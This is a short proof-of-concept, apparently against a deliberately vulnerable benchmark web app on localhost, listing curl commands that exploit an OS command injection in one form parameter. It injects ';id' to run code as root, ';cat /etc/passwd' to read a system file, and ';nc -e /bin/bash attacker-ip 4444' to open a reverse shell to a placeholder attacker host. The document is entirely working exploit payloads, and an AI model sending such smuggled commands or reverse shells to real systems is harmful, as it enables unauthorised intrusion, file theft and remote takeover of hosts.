# OS command injection - arbitrary execution as root
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
  -d 'BenchmarkTest01191=;id'

# Read sensitive files
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
  -d 'BenchmarkTest01191=;cat /etc/passwd'

# Reverse shell (if tools available)
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest01191' \
  -d 'BenchmarkTest01191=;nc -e /bin/bash attacker-ip 4444'

# The GET route also works (calls same handler) but needs form param sent